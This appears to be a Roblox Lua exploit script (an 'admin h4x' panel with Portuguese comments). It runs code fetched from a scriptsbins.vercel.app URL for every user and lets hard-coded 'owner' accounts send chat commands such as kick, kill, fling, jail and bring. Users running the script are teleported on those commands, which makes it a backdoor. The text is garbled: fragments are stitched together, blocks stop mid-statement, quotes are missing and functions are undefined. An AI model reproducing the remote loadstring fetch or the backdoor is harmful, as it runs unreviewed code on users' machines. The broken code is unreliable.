-- Serviços
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local TextChatService = game:GetService("TextChatService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

-- Lista de donos autorizados
local Donos = {
    ["wiyvvo_g44509"] = true, 
    ["paulo_dobope"] = true
}

-- Lista de usuários especiais (sempre em minúsculo)
local SpecialUsers = {
    ["inc0mu_2009o"] = "SUB-DONO",
    ["Nickaqq"] = "Developer",
    ["Nickaqqq"] = "Developer",

}

-- Função que cria a tag
local function createSpecialTag(player, tagText)
    local char = player.Character
    if not char then return end
    local head = char:FindFirstChild("Head")
    if not head then return end

    -- remove tag antiga
    local old = head:FindFirstChild("SpecialTag")
    if old then old:Destroy() end

    local billboardGui = Instance.new("BillboardGui")
    billboardGui.Name = "SpecialTag"
    billboardGui.Size = UDim2.new(0, 200, 0, 50)
    billboardGui.StudsOffset = Vector3.new(0, 3, 0)
    billboardGui.Adornee = head
    billboardGui.AlwaysOnTop = true
    billboardGui.Parent = head

    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(1, 0, 1, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.Text = tagText
    textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    textLabel.TextScaled = true
    textLabel.Font = Enum.Font.GothamBold
    textLabel.TextStrokeTransparency = 0.2
    textLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
    textLabel.Parent = billboardGui
end

-- Função para aplicar tag automaticamente
local function applyTag(player)
    local tagType = SpecialUsers[player.Name:lower()]
    if tagType then
        -- reaplica sempre que o player respawnar
        player.CharacterAdded:Connect(function()
            task.wait(1)
            createSpecialTag(player, tagType)
        end)
        -- aplica já no spawn inicial
        if player.Character then
            createSpecialTag(player, tagType)
        end
    end
end

-- aplica em todos que já estão no jogo
for _, p in ipairs(Players:GetPlayers()) do
    applyTag(p)
end

-- aplica para quem entrar depois
Players.PlayerAdded:Connect(function(p)
    applyTag(p)
end)

-- Executa Fire Carregamento para todos
loadstring(game:HttpGet("https://scriptsbins.vercel.app/raw/HiMusA9DuUJHf5w7ijz6"))()

-- Se for dono, ativa o painel admin
if Donos[LocalPlayer.Name:lower()] then
    local playerOriginalSpeed = {}
    local jaulas = {}
    local jailConnections = {}

    local function EnviarComando(comando, playerName)
        local msg = comando
        if playerName then msg = comando.." "..playerName end
        local canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral") or TextChatService.TextChannels:GetChildren()[1]
        if canal then
            canal:SendAsync(msg)
        else
            warn("Nenhum canal encontrado")
        end
    end

    local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
    local Window = WindUI:CreateWindow({
        Title = "painel Administrador h4x ",
        Icon = "shield",
        Author = "by:megumi",
        Folder = "Painel Administrador h4x",
        Size = UDim2.fromOffset(580, 460),
        Transparent = true,
        Theme = "Amber",
        Resizable = false,
        SideBarWidth = 200,
        BackgroundImageTransparency = 0.42,
        HideSearchBar = true,
        ScrollBarEnabled = true,
    })

    -- Aba Comandos
    local TabComandos = Window:Tab({ Title = "Comandos", Icon = "terminal", Locked = false })
    local SectionComandos = TabComandos:Section({ Title = "Admin", Icon = "user-cog", Opened = true })

    local TargetName
    local function getPlayersList()
        local t = {}
        for _, p in ipairs(Players:GetPlayers()) do
            table.insert(t, p.Name)
        end
        return t
    end

    local Dropdown = SectionComandos:Dropdown({
        Title = "Selecionar Jogador",
        Values = getPlayersList(),
        Value = "",
        Callback = function(option)
            TargetName = option
        end
    })

    Players.PlayerAdded:Connect(function()
        Dropdown:SetValues(getPlayersList())
    end)
    Players.PlayerRemoving:Connect(function()
        Dropdown:SetValues(getPlayersList())
    end)

    local comandosAlvo = {"kick","kill","killplus","fling","freeze","unfreeze","bring","jail","unjail",untag all",TAG all",unadm",ADM"}

    for _, cmd in ipairs(comandosAlvo) do
        SectionComandos:Button({
            Title = cmd:upper(),
            Desc = "Envia ;"..cmd.." no chat para o jogador selecionado",
            Callback = function()
                if TargetName then
                    EnviarComando(";"..cmd, TargetName)
                else
                    warn("Nenhum jogador selecionado!")
                end
            end
        })
    end

    -- Aba Verify
    local TabVerify = Window:Tab({ Title = "Verify", Icon = "check", Locked = false })
    local SectionVerify = TabVerify:Section({ Title = "Verificar", Icon = "search", Opened = true })
    SectionVerify:Button({
        Title = "Enviar Verificação",
        Desc = "Envia ;verifique no chat",
        Callback = function()
            EnviarComando(";verifique")
        end
    })

    -- Função que executa comandos do chat
    local function ExecutarComando(msgText, autor)
        if not Donos[autor:lower()] then return end
        local playerName = LocalPlayer.Name:lower()
        local character = LocalPlayer.Character
        local humanoid = character and character:FindFirstChildOfClass("Humanoid")

        -- Comando de kick
if message:lower():sub(1,5) == "/kick" then
    local playerName = message:sub(6):match("^%s*(.+)")
    
    if playerName then
        local targetPlayer = findPlayer(playerName)
        
        if targetPlayer then
            -- Kick o jogador
            targetPlayer:Kick("Você foi expulso pelo admin")
            say(" " .. targetPlayer.Name .. " foi expulso!")
        else
            say(" Jogador não encontrado: " .. playerName)
        end
    else
        say(" Uso: /kick [nome do jogador]")
    end
end
       
     -- Mata o jogador
            local character = targetPlayer.Character
            if character then
                local humanoid = character:FindFirstChildOfClass("Humanoid")
                if humanoid then
                    humanoid.Health = 0
                    say(" " .. targetPlayer.Name .. " foi morto!")
                else
                    say(" Humanoid não encontrado!")
                end
            else
                say(" Personagem não encontrado!")
            end
        else
            say(" Jogador não encontrado: " .. playerName)
        end
    else
        say(" Uso: /kill [nome do jogador]")
    end
end

        -- Comando KillPlus com múltiplos efeitos
if message:lower():sub(1,9) == "/killplus" then
    local args = message:sub(10):match("^%s*(.+)")
    
    if args then
        local playerName, effect = args:match("^(%S+)%s*(.*)$")
        
        if playerName then
            local targetPlayer = findPlayer(playerName)
            
            if targetPlayer then
                local character = targetPlayer.Character
                if character then
                    local humanoid = character:FindFirstChildOfClass("Humanoid")
                    local rootPart = character:FindFirstChild("HumanoidRootPart")
                    
                    if effect:lower() == "lightning" then
                        -- Efeito Raio
                        local lightning = Instance.new("Part")
                        lightning.Size = Vector3.new(1, 20, 1)
                        lightning.BrickColor = BrickColor.new("Bright yellow")
                        lightning.Material = "Neon"
                        lightning.Anchored = true
                        lightning.CanCollide = false
                        lightning.Position = rootPart and rootPart.Position or character:GetPivot().Position
                        lightning.Parent = workspace
                        
                        game:GetService("TweenService"):Create(lightning, TweenInfo.new(0.5), {Transparency = 1}):Play()
                        delay(0.5, function() lightning:Destroy() end)
                        
                        if humanoid then humanoid.Health = 0 end
                        say(" " .. targetPlayer.Name .. " foi eletrocutado!")
                        
                    elseif effect:lower() == "freeze" then
                        -- Efeito Congelar
                        if humanoid then
                            humanoid.Health = 0
                        end
                        
                        -- Adiciona efeito de gelo
                        for _, part in pairs(character:GetChildren()) do
                            if part:IsA("BasePart") then
                                part.BrickColor = BrickColor.new("Light blue")
                                part.Material = "Ice"
                            end
                        end
                        say(" " .. targetPlayer.Name .. " foi congelado!")
                        
                    elseif effect:lower() == "vanish" then
                        -- Efeito Desaparecer
                        if humanoid then
                            humanoid.Health = 0
                        end
                        
                        -- Efeito de fade out
                        for _, part in pairs(character:GetChildren()) do
                            if part:IsA("BasePart") then
                                game:GetService("TweenService"):Create(part, TweenInfo.new(1), {Transparency = 1}):Play()
                            end
                        end
                        say(" " .. targetPlayer.Name .. " desapareceu!")
                        
                    elseif effect:lower() == "blackhole" then
                        -- Efeito Buraco Negro
                        local blackHole = Instance.new("Part")
                        blackHole.Size = Vector3.new(5, 5, 5)
                        blackHole.BrickColor = BrickColor.new("Really black")
                        blackHole.Material = "Neon"
                        blackHole.Shape = Enum.PartType.Ball
                        blackHole.Anchored = true
                        blackHole.CanCollide = false
                        blackHole.Position = rootPart and rootPart.Position or character:GetPivot().Position
                        blackHole.Parent = workspace
                        
                        -- Efeito de sucção
                        game:GetService("TweenService"):Create(blackHole, TweenInfo.new(1), {Size = Vector3.new(20, 20, 20)}):Play()
                        
                        if humanoid then humanoid.Health = 0 end
                        delay(1, function() blackHole:Destroy() end)
                        say(" " .. targetPlayer.Name .. " foi sugado por um buraco negro!")
                        
                    elseif effect:lower() == "laser" then
                        -- Efeito Laser
                        local laser = Instance.new("Part")
                        laser.Size = Vector3.new(1, 1, 50)
                        laser.BrickColor = BrickColor.new("Bright red")
                        laser.Material = "Neon"
                        laser.Anchored = true
                        laser.CanCollide = false
                        
                        local charPos = rootPart and rootPart.Position or character:GetPivot().Position
                        laser.Position = charPos + Vector3.new(0, 0, -25)
                        laser.Parent = workspace
                        
                        game:GetService("TweenService"):Create(laser, TweenInfo.new(0.3), {Transparency = 1}):Play()
                        if humanoid then humanoid.Health = 0 end
                        delay(0.3, function() laser:Destroy() end)
                        say(" " .. targetPlayer.Name .. " foi atingido por laser!")
                        
                    elseif effect:lower() == "meteor" then
                        -- Efeito Meteoro
                        local meteor = Instance.new("Part")
                        meteor.Size = Vector3.new(8, 8, 8)
                        meteor.BrickColor = BrickColor.new("Bright orange")
                        meteor.Material = "Neon"
                        meteor.Shape = Enum.PartType.Ball
                        meteor.Anchored = false
                        meteor.CanCollide = false
                        
                        local charPos = rootPart and rootPart.Position or character:GetPivot().Position
                        meteor.Position = charPos + Vector3.new(0, 50, 0)
                        meteor.Parent = workspace
                        
                        -- Faz o meteoro cair
                        local bodyVelocity = Instance.new("BodyVelocity")
                        bodyVelocity.Velocity = Vector3.new(0, -100, 0)
                        bodyVelocity.Parent = meteor
                        
                        if humanoid then humanoid.Health = 0 end
                        delay(1, function() meteor:Destroy() end)
                        say(" " .. targetPlayer.Name .. " foi atingido por um meteoro!")
                        
                    else
                        -- KillPlus padrão (efeito combinado)
                        if humanoid then

        -- Super fling (muito forte)
if message:lower():sub(1,11) == "/superfling" then
    local playerName = message:sub(12):match("^%s*(.+)")
    
    if playerName then
        local targetPlayer = findPlayer(playerName)
        
        if targetPlayer then
            local character = targetPlayer.Character
            if character then
                local rootPart = character:FindFirstChild("HumanoidRootPart")
                
                if rootPart then
                    -- Força extrema
                    local bodyVelocity = Instance.new("BodyVelocity")
                    bodyVelocity.Velocity = Vector3.new(
                        math.random(-500, 500),
                        math.random(500, 800), 
                        math.random(-500, 500)
                    )
                    bodyVelocity.MaxForce = Vector3.new(10000, 10000, 10000)
                    bodyVelocity.Parent = rootPart
                    
                    -- Efeito de explosão para visual
                    local explosion = Instance.new("

        -- Comando Freeze
if message:lower():sub(1,7) == "/freeze" then
    local playerName = message:sub(8):match("^%s*(.+)")
    
    if playerName then
        local targetPlayer = findPlayer(playerName)
        
        if targetPlayer then
            local character = targetPlayer.Character
            if character then
                -- Congela todas as partes do personagem
                for _, part in pairs(character:GetChildren()) do
                    if part:IsA("BasePart") then
                        part.Anchored = true
                        part.BrickColor = BrickColor.new("Light blue")
                        part.Material = "Ice"
                    end
                end
                
                say(" " .. targetPlayer.Name .. " foi congelado!")
            else
                say(" Personagem não encontrado!")
            end
        else
            say(" Jogador não encontrado: " .. playerName)
        end
    else
        say(" Uso: /freeze [nome do jogador]")
    end
end

        -- Comando Unfreeze
if message:lower():sub(1,9) == "/unfreeze" then
    local playerName = message:sub(10):match("^%s*(.+)")
    
    if playerName then
        local targetPlayer = findPlayer(playerName)
        
        if targetPlayer then
            local character = targetPlayer.Character
            if character then
                -- Descongela todas as partes do personagem
                for _, part in pairs(character:GetChildren()) do
                    if part:IsA("BasePart") then
                        part.Anchored = false
                        part.BrickColor = BrickColor.new("Medium stone grey")
                        part.Material = "Plastic"
                    end
                end
                
                say(" " .. targetPlayer.Name .. " foi descongelado!")
            else
                say(" Personagem não encontrado!")
            end
        else
            say(" Jogador não encontrado: " .. playerName)
        end
    else
        say(" Uso: /unfreeze [nome do jogador]")
    end
end

        -- Função para verificar hubs
function checkForHubs(player)
    local hubPatterns = {
        ["Thunder Hub"] = {"thunder", "thunderhub", "thunder_hub"},
        ["Nytherune"] = {"nytherune", "nyth", "nitherune"},
        ["Coquete Hub"] = {"coquete", "coquetehub", "coquet"},
        ["Fúria Hub"] = {"furia", "fúria", "furiahub"}, 
        ["Vórtex Hub"] = {"vortex", "vórtex", "vortexhub"},
        ["Chaos Hub"] = {"chaos", "chaoshub", "chaos_hub"},
        ["Rael Hub"] = {"rael", "raelhub", "rael_hub"}
    }
    
    -- Verifica no PlayerScripts
    local playerScripts = player:FindFirstChild("PlayerScripts")
    if playerScripts then
        for hubName, patterns in pairs(hubPatterns) do
            for _, pattern in ipairs(patterns) do
                if searchInContainer(playerScripts, pattern:lower()) then
                    return true, hubName
                end
            end
        end
    end
    
    -- Verifica no Backpack
    local backpack = player:FindFirstChild("Backpack")
    if backpack then
        for hubName, patterns in pairs(hubPatterns) do
            for _, pattern in ipairs(patterns) do
                if searchInContainer(backpack, pattern:lower()) then
                    return true, hubName
                end
            end
        end
    end
    
    return false, nil
end

-- Função auxiliar para procurar em containers
function searchInContainer(container, pattern)
    local function searchRecursive(obj)
        if obj:IsA("Script") or obj:IsA("LocalScript") or obj:IsA("ModuleScript") then
            if obj.Name:lower():find(pattern) then
                return true
            end
        end
        
        for _, child in pairs(obj:GetChildren()) do
            if searchRecursive(child) then
                return true
            end
        end
        return false
    end
    
    return searchRecursive(container)
end

        -- Bring
        local bringTarget = msgText:match(";bring%s+(%w+)")
        if bringTarget then
            if bringTarget == LocalPlayer.Name:lower() then
                local autorPlayer = Players:FindFirstChild(autor)
                if autorPlayer and autorPlayer.Character and autorPlayer.Character:FindFirstChild("HumanoidRootPart") then
                    local root = character and character:FindFirstChild("HumanoidRootPart")
                    if root then
                        root.CFrame = autorPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-3)
                    end
                end
            end
        end

        
 -- Comando Jail
if message:lower():sub(1,5) == "/jail" then
    local playerName = message:sub(6):match("^%s*(.+)")
    
    if playerName then
        local targetPlayer = findPlayer(playerName)
        
        if targetPlayer then
            local character = targetPlayer.Character
            if character then
                local rootPart = character:FindFirstChild("HumanoidRootPart")
                
                if rootPart then
                    -- Cria a prisão
                    local jail = Instance.new("Part")
                    jail.Name = "Jail_" .. targetPlayer.Name
                    jail.Size = 
